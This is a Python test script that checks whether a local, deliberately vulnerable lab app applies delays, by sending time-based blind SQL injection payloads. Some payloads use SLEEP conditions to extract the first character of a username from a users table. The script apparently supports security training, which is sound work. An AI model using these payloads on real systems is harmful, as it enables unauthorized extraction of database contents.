#!/usr/bin/env python3
"""
Test script to verify the lab app is applying delays correctly.
Run this while the lab app is running to see if delays are being applied.
"""

import requests
import time

def test_delay(payload, expected_delay=True):
    """Test if a payload triggers a delay."""
    url = "http://127.0.0.1:5000/vulnerable"
    
    print(f"\nTesting: {payload}")
    start = time.time()
    try:
        response = requests.get(url, params={'id': payload}, timeout=10)
        elapsed = time.time() - start
        print(f"  Response time: {elapsed:.3f}s")
        print(f"  Response: {response.json()}")
        
        if expected_delay:
            if elapsed > 1.5:  # Should be ~2s with delay
                print(f"  ✓ Delay applied correctly")
                return True
            else:
                print(f"  ✗ Delay NOT applied (expected ~2s, got {elapsed:.3f}s)")
                return False
        else:
            if elapsed < 0.5:  # Should be fast without delay
                print(f"  ✓ No delay (correct)")
                return True
            else:
                print(f"  ✗ Unexpected delay (expected <0.5s, got {elapsed:.3f}s)")
                return False
    except Exception as e:
        print(f"  ✗ Error: {e}")
        return False

if __name__ == '__main__':
    print("=" * 60)
    print("Testing Lab App Delay Functionality")
    print("=" * 60)
    print("\nMake sure the lab app is running: cd lab && python app.py")
    print("Check the lab app's terminal for [DEBUG] messages\n")
    
    results = []
    
    # Test 1: Simple condition that should be TRUE (should delay)
    results.append(("TRUE condition", test_delay("1 OR (1=1) AND SLEEP(2) -- -", True)))
    
    # Test 2: Simple condition that should be FALSE (should not delay)
    results.append(("FALSE condition", test_delay("1 OR (1=0) AND SLEEP(2) -- -", False)))
    
    # Test 3: No condition, just SLEEP (should always delay)
    results.append(("No condition", test_delay("1 AND SLEEP(2) -- -", True)))
    
    # Test 4: Complex condition with nested SELECT (should delay if true)
    results.append(("Complex TRUE", test_delay(
        "1 OR (UNICODE(SUBSTR((SELECT username FROM users WHERE 1=1 LIMIT 1), 1, 1)) >= 97) AND SLEEP(2) -- -",
        True
    )))
    
    # Test 5: Complex condition that should be FALSE (should not delay)
    results.append(("Complex FALSE", test_delay(
        "1 OR (UNICODE(SUBSTR((SELECT username FROM users WHERE 1=1 LIMIT 1), 1, 1)) >= 200) AND SLEEP(2) -- -",
        False
    )))
    
    print("\n" + "=" * 60)
    print("Summary")
    print("=" * 60)
    for name, result in results:
        status = "✓ PASS" if result else "✗ FAIL"
        print(f"{status}: {name}")
    
    all_passed = all(result for _, result in results)
    if all_passed:
        print("\n✓ All tests passed! The app is working correctly.")
    else:
        print("\n✗ Some tests failed. Check the lab app's debug output.")
        print("  Make sure you restarted the app after code changes!")

